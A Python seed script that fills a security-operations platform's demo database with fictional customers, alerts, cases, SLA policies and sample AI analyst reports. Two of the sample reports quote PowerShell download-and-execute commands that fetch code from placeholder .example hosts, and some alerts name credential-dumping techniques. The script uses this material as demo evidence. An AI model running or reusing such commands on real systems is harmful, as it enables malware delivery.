"""Demo data for the README screenshots and the product tour.

Seeds a month of believable, clearly fictional SOC history into a dedicated database:
four customers, a SOC team, ~200 alerts with assets, IoCs, tags and comments, cases with
playbook tasks and timelines, SLA clocks, AI Analyst reports and the Customer Portal
switches. Every timestamp is relative to "now", so a fresh seed always looks current.

Run from ``backend/`` with the backend's virtualenv (it imports the backend's models):

    python ../tools/readme-media/seed_demo.py seed       # prints JSON (logins, ids)
    python ../tools/readme-media/seed_demo.py cleanup

The database comes from ``README_DEMO_DB_URL`` (default: the ``copilot_readme`` database
on 127.0.0.1:13307). The script refuses a database whose name does not end in
``_readme`` unless ``README_DEMO_FORCE=1``: it deletes and recreates rows.

The rows are written straight to the tables, the way the e2e seeds in
``backend/tests/e2e`` do: SLA history needs past timestamps, which no API produces.
"""

import asyncio
import base64
import datetime
import hashlib
import json
import os
import random
import sys
from pathlib import Path
from urllib.parse import urlparse

# The backend's models are imported from the checkout this script lives in.
sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "backend"))

# The backend modules read these at import time; nothing below connects through them.
os.environ.setdefault("MYSQL_URL", "127.0.0.1:13307")
os.environ.setdefault("MYSQL_USER", "copilot")
os.environ.setdefault("MYSQL_PASSWORD", "copilot")
os.environ.setdefault("MYSQL_ROOT_PASSWORD", "unused")
os.environ.setdefault("JWT_SECRET", "readme-demo-seed-not-used-for-tokens")

from sqlalchemy import delete  # noqa: E402
from sqlalchemy import select  # noqa: E402
from sqlalchemy import update  # noqa: E402
from sqlalchemy.exc import IntegrityError  # noqa: E402
from sqlalchemy.ext.asyncio import AsyncSession  # noqa: E402
from sqlalchemy.ext.asyncio import create_async_engine  # noqa: E402
from sqlmodel import SQLModel  # noqa: E402

from app.auth.models.users import User  # noqa: E402
from app.auth.models.users import UserCustomerAccess  # noqa: E402
from app.auth.utils import AuthHandler  # noqa: E402
from app.db.universal_models import Agents  # noqa: E402
from app.db.universal_models import AiAnalystIoc  # noqa: E402
from app.db.universal_models import AiAnalystJob  # noqa: E402
from app.db.universal_models import AiAnalystReport  # noqa: E402
from app.db.universal_models import CustomerPortalAiReportSettings  # noqa: E402
from app.db.universal_models import CustomerPortalSettings  # noqa: E402
from app.db.universal_models import CustomerPortalSlaSettings  # noqa: E402
from app.db.universal_models import Customers  # noqa: E402
from app.db.universal_models import CustomersMeta  # noqa: E402
from app.incidents.models import Alert  # noqa: E402
from app.incidents.models import AlertContext  # noqa: E402
from app.incidents.models import AlertTag  # noqa: E402
from app.incidents.models import AlertToIoC  # noqa: E402
from app.incidents.models import AlertToTag  # noqa: E402
from app.incidents.models import Asset  # noqa: E402
from app.incidents.models import Case  # noqa: E402
from app.incidents.models import CaseAlertLink  # noqa: E402
from app.incidents.models import CaseComment  # noqa: E402
from app.incidents.models import CaseEvent  # noqa: E402
from app.incidents.models import CaseTask  # noqa: E402
from app.incidents.models import CaseTemplate  # noqa: E402
from app.incidents.models import CaseTemplateTask  # noqa: E402
from app.incidents.models import Comment  # noqa: E402
from app.incidents.models import IoC  # noqa: E402
from app.soc_management.domain.policy import PolicyRow  # noqa: E402
from app.soc_management.domain.policy import SlaEntity  # noqa: E402
from app.soc_management.domain.policy import resolve_targets  # noqa: E402
from app.soc_management.models.sla import AlertSlaTracking  # noqa: E402
from app.soc_management.models.sla import CaseSlaTracking  # noqa: E402
from app.soc_management.models.sla import SlaPolicy  # noqa: E402

DEFAULT_DB_URL = "mysql+aiomysql://copilot:copilot@127.0.0.1:13307/copilot_readme"
DB_URL = os.environ.get("README_DEMO_DB_URL", DEFAULT_DB_URL)
RANDOM_SEED = 20261018
DAYS = 60  # the 30-day views compare with the 30 days before

# --------------------------------------------------------------------------------------
# Who
# --------------------------------------------------------------------------------------

CUSTOMERS = {
    "ACME": {
        "name": "Acme Manufacturing",
        "contact": ("Rachel", "Alvarez"),
        "city": "Columbus",
        "postal_code": "43215",
        "state": "OH",
        "country": "United States",
        "type": "Manufacturing",
        "domain": "acme-mfg.example",
        "weight": 5,
    },
    "NWH": {
        "name": "Northwind Health",
        "contact": ("Daniel", "Okafor"),
        "city": "Portland",
        "postal_code": "97204",
        "state": "OR",
        "country": "United States",
        "type": "Healthcare",
        "domain": "northwind-health.example",
        "weight": 4,
    },
    "GLBX": {
        "name": "Globex Retail",
        "contact": ("Sofia", "Marchetti"),
        "city": "Chicago",
        "postal_code": "60606",
        "state": "IL",
        "country": "United States",
        "type": "Retail",
        "domain": "globex-retail.example",
        "weight": 3,
    },
    "INIT": {
        "name": "Initech Finance",
        "contact": ("Peter", "Lindqvist"),
        "city": "Austin",
        "postal_code": "78701",
        "state": "TX",
        "country": "United States",
        "type": "Financial Services",
        "domain": "initech-fin.example",
        "weight": 2,
    },
}
CODES = list(CUSTOMERS)

ADMIN = "admin"
ADMIN_PASSWORD = os.environ.get("README_DEMO_ADMIN_PASSWORD", "CoPilot-Demo-2026!")
PORTAL_USER = "jordan.harper"
PORTAL_PASSWORD = os.environ.get("README_DEMO_PORTAL_PASSWORD", "Portal-Demo-2026!")
ANALYST_PASSWORD = os.environ.get("README_DEMO_ANALYST_PASSWORD", "Analyst-Demo-2026!")
# analyst -> customers they work on
ANALYSTS = {
    "maria.lopez": ["ACME", "NWH", "GLBX", "INIT"],
    "jkim": ["ACME", "GLBX", "INIT"],
    "dsingh": ["NWH", "GLBX", "INIT"],
    "tobias.weber": ["ACME", "NWH"],
}
TEAM = list(ANALYSTS)

# Hosts and identities per customer, named the way those environments name them.
HOSTS = {
    "ACME": {
        "workstation": ["ACME-WS-0142", "ACME-WS-0218", "ACME-WS-0377", "ACME-LT-0904", "ACME-LT-1123", "ACME-ENG-0051"],
        "server": ["ACME-DC-01", "ACME-DC-02", "ACME-FS-02", "ACME-ERP-APP01", "ACME-SQL-01"],
        "linux": ["acme-web-01", "acme-bastion-01", "acme-mes-db02"],
        "ot": ["ACME-HMI-07", "ACME-HIST-01"],
    },
    "NWH": {
        "workstation": ["NWH-WS-2231", "NWH-WS-2290", "NWH-NURSE-114", "NWH-LT-0412"],
        "server": ["NWH-DC-01", "NWH-EHR-APP01", "NWH-PACS-01", "NWH-FS-01"],
        "linux": ["nwh-db-02", "nwh-vpn-gw01", "nwh-portal-web01"],
        "ot": ["NWH-MRI-WS02"],
    },
    "GLBX": {
        "workstation": ["GLBX-WS-1170", "GLBX-WS-1185", "GLBX-LT-0733", "GLBX-POS-0381", "GLBX-POS-0412"],
        "server": ["GLBX-DC-01", "GLBX-INV-APP02", "GLBX-SQL-03"],
        "linux": ["glbx-web-03", "glbx-k8s-node-5", "glbx-checkout-api01"],
        "ot": ["GLBX-DC-WMS01"],
    },
    "INIT": {
        "workstation": ["INIT-WS-0457", "INIT-WS-0503", "INIT-LT-0219", "INIT-TRD-0012"],
        "server": ["INIT-DC-02", "INIT-SQL-01", "INIT-CORE-APP01"],
        "linux": ["init-jump-01", "init-api-gw02"],
        "ot": ["INIT-SWIFT-GW01"],
    },
}
PEOPLE = {
    "ACME": ["r.alvarez", "m.chen", "k.osei", "l.brandt", "s.novak", "d.fischer"],
    "NWH": ["d.okafor", "a.patel", "j.reyes", "h.nguyen", "e.walsh"],
    "GLBX": ["s.marchetti", "b.cole", "t.yamamoto", "n.ibrahim", "c.dubois"],
    "INIT": ["p.lindqvist", "m.rossi", "g.adeyemi", "w.zhang"],
}

# --------------------------------------------------------------------------------------
# What
# --------------------------------------------------------------------------------------

# Each rule: title, source, severity, share of false positives, weight, host kind, tags,
# IoC kinds, description template, and analyst notes that fit it.
RULES = [
    {
        "title": "Brute force SSH login",
        "source": "wazuh",
        "severity": "Medium",
        "fp": 0.45,
        "weight": 16,
        "host": "linux",
        "tags": ["T1110.001", "credential-access"],
        "iocs": ["ext_ip"],
        "desc": "Wazuh rule 5712 fired: 42 failed sshd logins for invalid users from {ip} on {host} within 120 seconds.",
        "notes": [
            "Source {ip} is a known scanner on several threat feeds. No successful login followed. Added to the edge block list.",
            "Rate limited by fail2ban after 40 attempts; no valid accounts targeted.",
        ],
        "case": "SSH brute force against {host}",
    },
    {
        "title": "Impossible travel sign-in",
        "source": "office365",
        "severity": "High",
        "fp": 0.35,
        "weight": 9,
        "host": "user",
        "tags": ["T1078.004", "identity", "m365"],
        "iocs": ["ext_ip", "ext_ip"],
        "desc": "{user} signed in from {ip} (Lagos, NG) 38 minutes after a sign-in from Columbus, US. Entra ID risk level: high.",
        "notes": [
            "User confirmed they are not travelling. Sessions revoked and password reset forced; MFA method re-registered.",
            "Second location is the corporate VPN egress in Frankfurt. Expected behaviour, closing as false positive.",
        ],
        "case": "Account compromise investigation: {user}",
    },
    {
        "title": "Mimikatz credential dumping",
        "source": "crowdstrike",
        "severity": "Critical",
        "fp": 0.02,
        "weight": 2,
        "host": "workstation",
        "tags": ["T1003.001", "credential-access", "edr"],
        "iocs": ["hash", "int_ip"],
        "desc": "Falcon detected sekurlsa::logonpasswords activity on {host}: a renamed mimikatz binary (svchost64.exe) read LSASS memory as {user}.",
        "notes": [
            "Host network-contained in Falcon. Pulling a memory image with Velociraptor before remediation.",
            "Binary hash matches a public mimikatz 2.2.0 build. Resetting every credential cached on this host.",
        ],
        "case": "Credential theft on {host}",
    },
    {
        "title": "Suspicious PowerShell encoded command",
        "source": "wazuh",
        "severity": "High",
        "fp": 0.2,
        "weight": 8,
        "host": "workstation",
        "tags": ["T1059.001", "execution", "sysmon"],
        "iocs": ["hash", "domain"],
        "desc": "Sysmon event 1 on {host}: powershell.exe -nop -w hidden -EncodedCommand launched by {user}; decoded script downloads a second stage over HTTPS.",
        "notes": [
            "Decoded payload pulls a .NET loader from the domain in the IoCs. Domain sinkholed at the DNS filter.",
            "Script belongs to the software deployment tool (signed by IT). Tuning rule to exclude the deployment service account.",
        ],
        "case": "Malicious PowerShell on {host}",
    },
    {
        "title": "Office macro spawned cmd.exe",
        "source": "sigma",
        "severity": "High",
        "fp": 0.1,
        "weight": 5,
        "host": "workstation",
        "tags": ["T1204.002", "initial-access", "sigma-alert"],
        "iocs": ["hash", "url"],
        "desc": "Velociraptor Sigma: WINWORD.EXE spawned cmd.exe /c on {host} after {user} opened Invoice_Q3_2026.docm from Outlook.",
        "notes": [
            "Attachment arrived from an external sender impersonating a supplier. Purging the message tenant-wide.",
            "Child process was blocked by ASR; no persistence found in the triage collection.",
        ],
        "case": "Phishing payload executed on {host}",
    },
    {
        "title": "Phishing link clicked",
        "source": "office365",
        "severity": "Medium",
        "fp": 0.25,
        "weight": 9,
        "host": "user",
        "tags": ["T1566.002", "phishing", "m365"],
        "iocs": ["url", "domain"],
        "desc": "Defender for Office 365 Safe Links: {user} clicked a link to a credential-harvesting page that was weaponised after delivery.",
        "notes": [
            "User entered no credentials (confirmed in the proxy logs, no POST to the page). Message removed from 14 mailboxes.",
            "Clicked, but Safe Links blocked the page. Sent the user the phishing awareness module.",
        ],
        "case": "Phishing campaign targeting {customer}",
    },
    {
        "title": "DNS tunneling suspected",
        "source": "fortinet",
        "severity": "High",
        "fp": 0.5,
        "weight": 4,
        "host": "workstation",
        "tags": ["T1071.004", "command-and-control", "dns"],
        "iocs": ["domain", "int_ip"],
        "desc": "FortiGate DNS logs: {host} issued 3,812 TXT queries with high-entropy subdomains to a single domain in 10 minutes.",
        "notes": [
            "Query pattern matches the endpoint's VPN client health check. False positive, rule threshold raised for this client.",
            "Long base32 labels and no legitimate resolver behind the domain. Host isolated pending forensics.",
        ],
        "case": "Possible DNS exfiltration from {host}",
    },
    {
        "title": "Port scan from external host",
        "source": "fortinet",
        "severity": "Low",
        "fp": 0.55,
        "weight": 13,
        "host": "linux",
        "tags": ["T1046", "reconnaissance", "network"],
        "iocs": ["ext_ip"],
        "desc": "FortiGate IPS: {ip} probed 1,024 TCP ports on the public address of {host}; all connections dropped by policy.",
        "notes": ["Internet background noise, nothing exposed beyond 443. Closing."],
        "case": "External reconnaissance against {customer}",
    },
    {
        "title": "New local administrator account created",
        "source": "wazuh",
        "severity": "High",
        "fp": 0.3,
        "weight": 4,
        "host": "server",
        "tags": ["T1136.001", "persistence", "windows"],
        "iocs": [],
        "desc": "Windows event 4720 then 4732 on {host}: account 'svc_backup2' created and added to Administrators by {user}.",
        "notes": [
            "Change ticket CHG-20417 covers this account for the new backup agent. Expected activity.",
            "No change ticket and the creating session came from a workstation that is not a jump host. Escalating.",
        ],
        "case": "Unauthorised admin account on {host}",
    },
    {
        "title": "Ransomware behavior: mass file encryption",
        "source": "crowdstrike",
        "severity": "Critical",
        "fp": 0.0,
        "weight": 1,
        "host": "server",
        "tags": ["T1486", "impact", "edr"],
        "iocs": ["hash", "ext_ip"],
        "desc": "Falcon blocked a process on {host} that renamed 1,240 files on \\\\{host}\\share to *.lockd in 45 seconds and dropped README_RESTORE.txt.",
        "notes": [
            "Process killed by Falcon prevention after 1.2k files. Restoring the share from the 02:00 snapshot.",
            "Initial access traced to an exposed RDP service. Firewall rule removed, incident handed to the customer's IR retainer.",
        ],
        "case": "Ransomware attempt on {host}",
    },
    {
        "title": "Anomalous SharePoint download volume",
        "source": "uba",
        "severity": "Medium",
        "fp": 0.4,
        "weight": 4,
        "host": "user",
        "tags": ["T1530", "exfiltration", "uba"],
        "iocs": ["ext_ip"],
        "desc": "UBA: {user} downloaded 2.4 GB from 3 SharePoint sites in one hour, 18x their 30-day baseline.",
        "notes": [
            "User is preparing an audit export; manager confirmed. Marking as expected activity.",
            "User resigned last week. Access disabled; HR and legal informed.",
        ],
        "case": "Possible data exfiltration by {user}",
    },
    {
        "title": "Scheduled task created for persistence",
        "source": "sigma",
        "severity": "Medium",
        "fp": 0.35,
        "weight": 5,
        "host": "workstation",
        "tags": ["T1053.005", "persistence", "sigma-alert"],
        "iocs": ["hash"],
        "desc": "Velociraptor Sigma: schtasks.exe /create /sc onlogon /tn 'OneDrive Update' running %APPDATA%\\upd.exe on {host}.",
        "notes": [
            "Binary is unsigned and not the OneDrive updater. Task removed and binary submitted to File Analysis.",
            "Legitimate vendor updater. Excluded by path.",
        ],
        "case": "Persistence mechanism on {host}",
    },
    {
        "title": "Kerberoasting: RC4 service ticket requests",
        "source": "wazuh",
        "severity": "High",
        "fp": 0.15,
        "weight": 3,
        "host": "server",
        "tags": ["T1558.003", "credential-access", "active-directory"],
        "iocs": ["int_ip"],
        "desc": "{host}: 37 Kerberos TGS requests with RC4 encryption for distinct SPNs from one account ({user}) in 2 minutes (event 4769).",
        "notes": [
            "Requests came from the vulnerability scanner's authenticated scan. Expected.",
            "Account has no business requesting these tickets. Rotating service account passwords to 30+ characters.",
        ],
        "case": "Kerberoasting activity in {customer} AD",
    },
    {
        "title": "Defender real-time protection disabled",
        "source": "defender",
        "severity": "High",
        "fp": 0.2,
        "weight": 4,
        "host": "workstation",
        "tags": ["T1562.001", "defense-evasion"],
        "iocs": [],
        "desc": "Microsoft Defender for Endpoint: real-time protection turned off on {host} through Set-MpPreference by {user}.",
        "notes": [
            "Helpdesk disabled it temporarily to install CAD software. Re-enabled, policy now enforced via Intune.",
            "No helpdesk ticket. Tamper protection enabled and the host queued for a full scan.",
        ],
        "case": "Defense evasion on {host}",
    },
    {
        "title": "MFA push fatigue: repeated denied prompts",
        "source": "duo",
        "severity": "Medium",
        "fp": 0.3,
        "weight": 4,
        "host": "user",
        "tags": ["T1621", "identity", "mfa"],
        "iocs": ["ext_ip"],
        "desc": "Duo: {user} denied 11 push requests in 6 minutes from an unrecognised device at {ip}.",
        "notes": [
            "Password confirmed compromised (found in a stealer log). Reset done, number matching enforced.",
            "User's new phone was re-enrolling. Benign.",
        ],
        "case": "MFA fatigue attack on {user}",
    },
    {
        "title": "Web shell upload attempt blocked",
        "source": "waf",
        "severity": "Medium",
        "fp": 0.45,
        "weight": 5,
        "host": "linux",
        "tags": ["T1505.003", "web", "waf"],
        "iocs": ["ext_ip", "url"],
        "desc": "SOCFortress WAF blocked a multipart upload of shell.php disguised as image/png to /uploads on {host} from {ip}.",
        "notes": ["Blocked at the WAF; the upload path is not writable anyway. Source added to the WAF block list."],
        "case": "Web application attack against {host}",
    },
    {
        "title": "Outbound connection to known C2 infrastructure",
        "source": "fortinet",
        "severity": "Critical",
        "fp": 0.05,
        "weight": 2,
        "host": "workstation",
        "tags": ["T1071.001", "command-and-control"],
        "iocs": ["ext_ip", "domain"],
        "desc": "FortiGate: {host} beaconing every 60 seconds (jitter 10%) to {ip}, listed as Cobalt Strike team server infrastructure.",
        "notes": [
            "Beacon confirmed in the process tree (rundll32 with no arguments). Host contained, collecting artifacts.",
            "Destination is a CDN edge that shares the listed IP. Not malicious.",
        ],
        "case": "Command-and-control beaconing from {host}",
    },
    {
        "title": "LSASS memory access by unsigned process",
        "source": "sigma",
        "severity": "High",
        "fp": 0.25,
        "weight": 3,
        "host": "server",
        "tags": ["T1003.001", "credential-access", "sigma-alert"],
        "iocs": ["hash"],
        "desc": "Velociraptor Sigma: an unsigned process opened lsass.exe with PROCESS_VM_READ on {host} (Sysmon event 10).",
        "notes": [
            "The backup agent's helper triggers this. Signed vendor build rolled out, exclusion added.",
            "Dumped with comsvcs.dll MiniDump; treating as credential theft.",
        ],
        "case": "LSASS access on {host}",
    },
    {
        "title": "Privileged group membership change",
        "source": "wazuh",
        "severity": "Medium",
        "fp": 0.4,
        "weight": 5,
        "host": "server",
        "tags": ["T1098", "persistence", "active-directory"],
        "iocs": [],
        "desc": "{host}: {user} added to 'Domain Admins' (event 4728) outside the change window.",
        "notes": ["Approved emergency change for the patching weekend. Membership removed again Monday 09:00."],
        "case": "Privilege escalation in {customer} AD",
    },
]
RULE_BY_TITLE = {rule["title"]: rule for rule in RULES}

# Alerts mapped to a playbook: (template name, rules it applies to).
TEMPLATES = [
    {
        "name": "Credential Theft Investigation",
        "description": "Credential dumping or theft on an endpoint: contain, scope and reset.",
        "rules": ["Mimikatz credential dumping", "LSASS memory access by unsigned process", "Kerberoasting: RC4 service ticket requests"],
        "tasks": [
            ("Contain the host", "Network-contain the endpoint in the EDR before collecting evidence.", True),
            ("Collect a memory image and triage package", "Velociraptor: Windows.Memory.Acquisition and Windows.KapeFiles.Targets.", True),
            ("Identify accounts with cached credentials", "List interactive and service logons on the host in the last 7 days.", True),
            ("Reset exposed credentials", "Reset every account found above, krbtgt twice if a DC was involved.", True),
            ("Hunt for lateral movement", "Search for logons from the host's accounts on other systems.", False),
        ],
    },
    {
        "name": "Phishing Response",
        "description": "A user received, clicked or opened a phishing message.",
        "rules": ["Phishing link clicked", "Office macro spawned cmd.exe"],
        "tasks": [
            ("Purge the message tenant-wide", "Search-and-purge every copy of the message by sender and subject.", True),
            ("Check for credential entry", "Proxy and sign-in logs: did the user submit credentials or approve MFA?", True),
            ("Block sender and URLs", "Add the sender domain and URLs to the mail and web filters.", True),
            ("Notify the affected users", "Send the awareness notice and the reporting reminder.", False),
        ],
    },
    {
        "name": "Account Compromise",
        "description": "Suspicious sign-ins, MFA abuse or anomalous user behaviour.",
        "rules": ["Impossible travel sign-in", "MFA push fatigue: repeated denied prompts", "Anomalous SharePoint download volume"],
        "tasks": [
            ("Revoke sessions and reset the password", "Revoke refresh tokens in Entra ID and force a reset.", True),
            ("Review mailbox rules and OAuth grants", "Look for forwarding rules and consented apps added by the attacker.", True),
            ("Confirm activity with the user", "Ask the user (through a known channel) whether the activity was theirs.", False),
            ("Review data accessed", "Unified audit log: files and mail accessed during the suspicious sessions.", False),
        ],
    },
    {
        "name": "Malware Containment",
        "description": "Malware execution, ransomware precursors and C2 beaconing.",
        "rules": [
            "Suspicious PowerShell encoded command",
            "Ransomware behavior: mass file encryption",
            "Outbound connection to known C2 infrastructure",
            "DNS tunneling suspected",
            "Scheduled task created for persistence",
            "Defender real-time protection disabled",
        ],
        "tasks": [
            ("Isolate the affected host", "EDR network containment; keep the host powered on.", True),
            ("Acquire the sample", "Collect the binary with Velociraptor and submit it to File Analysis.", True),
            ("Block IoCs at the perimeter", "Hashes in the EDR, domains and IPs on the firewall and DNS filter.", True),
            ("Scope across the fleet", "Hunt for the hash and C2 destinations on every endpoint of the customer.", True),
            ("Remediate and return to service", "Reimage or clean, then lift containment.", False),
        ],
    },
]
TEMPLATE_FOR_RULE = {rule: template["name"] for template in TEMPLATES for rule in template["rules"]}
# What an analyst writes when a playbook task is done.
TASK_EVIDENCE = {
    "Contain the host": "Network containment applied in the EDR console; host shows as contained, heartbeat still reporting.",
    "Collect a memory image and triage package": "Windows.Memory.Acquisition and KapeFiles.Targets collected (4.1 GB), stored in the case data store.",
    "Identify accounts with cached credentials": "3 accounts with interactive logons in 7 days: the user, svc_print, adm.fischer.",
    "Reset exposed credentials": "All three reset by the customer's IT; sessions revoked.",
    "Hunt for lateral movement": "No 4624 type 3/10 logons from the host's accounts elsewhere in the last 72 h.",
    "Purge the message tenant-wide": "Search-and-purge removed the message from every recipient mailbox.",
    "Check for credential entry": "No POST to the phishing page in the proxy logs; no risky sign-in after the click.",
    "Block sender and URLs": "Sender domain and URLs added to the mail and web filter block lists.",
    "Notify the affected users": "Awareness notice sent to the recipients.",
    "Revoke sessions and reset the password": "Refresh tokens revoked in Entra ID; password reset forced at next sign-in.",
    "Review mailbox rules and OAuth grants": "One forwarding rule removed; no new OAuth consents.",
    "Confirm activity with the user": "Confirmed by phone through the service desk.",
    "Review data accessed": "Unified audit log reviewed; no sensitive files accessed during the sessions.",
    "Isolate the affected host": "Host isolated in the EDR; user moved to a loaner laptop.",
    "Acquire the sample": "Sample collected with Velociraptor and submitted to File Analysis.",
    "Block IoCs at the perimeter": "Hash blocked in the EDR, domain sinkholed, IPs blocked on the edge firewall.",
    "Scope across the fleet": "Fleet-wide hunt: no other endpoint has the hash or contacted the destinations.",
    "Remediate and return to service": "Host reimaged and returned to the user.",
}

# Global SLA policy, plus two customers with contractual overrides.
POLICY = [
    PolicyRow(None, SlaEntity.ALERT, "Critical", 15, 240),
    PolicyRow(None, SlaEntity.ALERT, "High", 60, 480),
    PolicyRow(None, SlaEntity.ALERT, "Medium", 240, 1440),
    PolicyRow(None, SlaEntity.ALERT, "Low", 480, 4320),
    PolicyRow(None, SlaEntity.CASE, "Critical", 30, 1440),
    PolicyRow(None, SlaEntity.CASE, "High", 60, 4320),
    PolicyRow("NWH", SlaEntity.ALERT, "Critical", 10, 180),
    PolicyRow("NWH", SlaEntity.ALERT, "High", 30, 360),
    PolicyRow("GLBX", SlaEntity.ALERT, "High", 30, 360),
    PolicyRow("GLBX", SlaEntity.CASE, "High", 30, 1440),
]

ACK_MEDIAN = {"Critical": 4, "High": 11, "Medium": 40, "Low": 110, "Informational": 600}
RESOLVE_MEDIAN = {"Critical": 70, "High": 120, "Medium": 360, "Low": 900, "Informational": 4000}

CITIES = ["Lagos, NG", "São Paulo, BR", "Bucharest, RO", "Hanoi, VN", "Kyiv, UA", "Jakarta, ID", "Caracas, VE"]


def _now() -> datetime.datetime:
    return datetime.datetime.utcnow().replace(microsecond=0)


def _minutes(rng: random.Random, median: float, spread: float = 0.9) -> datetime.timedelta:
    """A log-normal delay around ``median`` minutes: mostly near it, a long tail beyond."""
    return datetime.timedelta(minutes=max(1.0, rng.lognormvariate(0, spread) * median))


class Fakes:
    """Deterministic, obviously fictional indicators: documentation IP ranges, reserved TLDs."""

    def __init__(self, rng: random.Random):
        self.rng = rng

    def ext_ip(self) -> str:
        prefix = self.rng.choice(["203.0.113", "198.51.100", "192.0.2"])
        return f"{prefix}.{self.rng.randint(2, 254)}"

    def int_ip(self) -> str:
        return f"10.{self.rng.randint(10, 40)}.{self.rng.randint(0, 20)}.{self.rng.randint(2, 250)}"

    def sha256(self) -> str:
        return hashlib.sha256(str(self.rng.random()).encode()).hexdigest()

    def domain(self) -> str:
        first = self.rng.choice(["cdn-sync", "update-check", "telemetry-relay", "docs-share", "auth-verify", "files-portal"])
        second = self.rng.choice(["svc", "cloud", "edge", "node", "hub"])
        return f"{first}-{second}{self.rng.randint(2, 98)}.example"

    def url(self) -> str:
        path = self.rng.choice(["/login/session", "/invoice/view.php", "/dl/Invoice_Q3.docm", "/uploads/shell.php", "/sso/verify"])
        return f"https://{self.domain()}{path}"

    def doc_id(self) -> str:
        alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_"
        return "".join(self.rng.choice(alphabet) for _ in range(20))


IOC_DESCRIPTIONS = {
    "ext_ip": ("IP", "Source address seen in the event"),
    "int_ip": ("IP", "Internal address involved"),
    "hash": ("HASH", "SHA-256 of the binary"),
    "domain": ("DOMAIN", "Destination domain"),
    "url": ("URL", "URL observed in the event"),
}


def _ioc_value(fakes: Fakes, kind: str) -> str:
    return getattr(fakes, {"hash": "sha256"}.get(kind, kind))()


# --------------------------------------------------------------------------------------
# Hero items: the alerts the screenshots and the tour open, with hand-written content.
# --------------------------------------------------------------------------------------

HERO_REPORT = """### Verdict: true positive, credential theft in progress

A renamed **mimikatz** build (`svchost64.exe`) executed on **ACME-WS-0142** under the account `ACME\\l.brandt` and read LSASS memory. The parent chain shows initial access through a malicious Office macro 14 minutes earlier, followed by an encoded PowerShell download cradle.

### Timeline (UTC)

| Time | Event |
|---|---|
| {t0} | `Invoice_Q3_2026.docm` opened from Outlook |
| {t1} | `WINWORD.EXE` spawned `cmd.exe /c powershell -nop -w hidden -enc …` |
| {t2} | Stage-2 downloaded from `cdn-sync-edge41.example` (203.0.113.77) |
| {t3} | `svchost64.exe` written to `C:\\Users\\Public\\` |
| {t4} | LSASS handle opened with `PROCESS_VM_READ` (Sysmon EID 10) |

### Evidence

```powershell
powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA...
# decoded:
IEX (New-Object Net.WebClient).DownloadString('https://cdn-sync-edge41.example/a.ps1')
```

The binary's SHA-256 matches a public mimikatz 2.2.0 release (VirusTotal **61/72**). No lateral movement observed yet: the account's other logons in the last 24 h are local.

### MITRE ATT&CK

- **T1204.002** User Execution: Malicious File
- **T1059.001** Command and Scripting Interpreter: PowerShell
- **T1003.001** OS Credential Dumping: LSASS Memory
"""

# Plain text: the Customer Portal shows recommended actions verbatim, not as markdown.
HERO_ACTIONS = """1. Keep ACME-WS-0142 network-contained until the memory image is collected.
2. Reset l.brandt and every account with a cached logon on the host (3 found).
3. Block cdn-sync-edge41.example and 203.0.113.77 at the firewall and DNS filter.
4. Hunt the SHA-256 across all Acme endpoints with a Velociraptor hash hunt.
5. Purge the phishing message from all mailboxes (sender billing@supplier-invoices.example).
"""

AI_REPORTS = [
    {
        "key": "hero",
        "severity": "Critical",
        "summary": (
            "Confirmed credential theft: a renamed mimikatz binary dumped LSASS on ACME-WS-0142 after a "
            "macro-enabled invoice ran an encoded PowerShell download cradle. Contain, reset credentials and hunt the hash."
        ),
        "markdown": HERO_REPORT,
        "actions": HERO_ACTIONS,
        "template": "credential_access",
        "iocs": [
            ("svchost64.exe", "process", "malicious", "61/72", "Renamed mimikatz 2.2.0"),
            ("cdn-sync-edge41.example", "domain", "malicious", "14/94", "Stage-2 host"),
            ("203.0.113.77", "ip", "suspicious", "6/94", "Resolves the stage-2 domain"),
            ("l.brandt", "user", "unknown", None, "Account whose session ran the binary"),
        ],
    },
    {
        "key": "travel",
        "severity": "High",
        "summary": (
            "Sign-in from Lagos 38 minutes after one from Columbus, from a hosting-provider address with no prior history "
            "for this user. The session registered a new MFA method: treat as account takeover."
        ),
        "markdown": """### Verdict: likely account takeover

The second sign-in used a legacy-authentication-free client but came from **203.0.113.19**, an address in a hosting provider's range that no ACME user has used before. Within 6 minutes the session **registered a new authenticator app**, which the user did not request.

### Signals

| Signal | Value |
|---|---|
| Distance between sign-ins | 9,480 km in 38 min |
| Entra ID risk level | High (`unfamiliarFeatures`, `anonymizedIPAddress`) |
| New MFA method | Microsoft Authenticator, device `iPhone15,3` |
| Mailbox rules added | 1 (forward messages containing "invoice") |

### MITRE ATT&CK

- **T1078.004** Valid Accounts: Cloud Accounts
- **T1098.005** Account Manipulation: Device Registration
""",
        "actions": """1. Revoke all refresh tokens and reset the password.
2. Remove the newly registered authenticator and the inbox forwarding rule.
3. Review mail sent from the account in the last 24 hours.
""",
        "template": "identity",
        "iocs": [
            ("203.0.113.19", "ip", "suspicious", "4/94", "Hosting provider, first seen for this tenant"),
            ("m.chen@acme-mfg.example", "user", "unknown", None, "Affected account"),
        ],
    },
    {
        "key": "powershell",
        "severity": "High",
        "summary": (
            "Encoded PowerShell launched from a user session downloaded a .NET loader. The domain is newly registered and "
            "the loader matches a known commodity stealer family."
        ),
        "markdown": """### Verdict: true positive, commodity stealer loader

`powershell.exe` ran with `-EncodedCommand` from an interactive session. The decoded script downloads `loader.bin` and reflectively loads it. The domain was registered 3 days ago.

```powershell
$u='https://telemetry-relay-hub7.example/loader.bin'
$b=(New-Object Net.WebClient).DownloadData($u)
[Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)
```

### MITRE ATT&CK

- **T1059.001** PowerShell
- **T1620** Reflective Code Loading
""",
        "actions": """1. Isolate the host and collect the loader from memory.
2. Block the domain at the DNS filter.
3. Reset browser-stored credentials for the user.
""",
        "template": "malware",
        "iocs": [
            ("telemetry-relay-hub7.example", "domain", "malicious", "9/94", "Loader host, registered 3 days ago"),
            ("loader.bin", "process", "malicious", "38/72", "Reflectively loaded .NET assembly"),
        ],
    },
]


async def _delete_referencing(s: AsyncSession, target_table: str, target_column: str, values: list) -> None:
    """Delete rows of every table with a foreign key to ``target_table.target_column``."""
    tables = [
        (table, fk.parent)
        for table in SQLModel.metadata.sorted_tables
        if table.name != target_table
        for fk in table.foreign_keys
        if fk.column.table.name == target_table and fk.column.name == target_column
    ]
    pending = tables
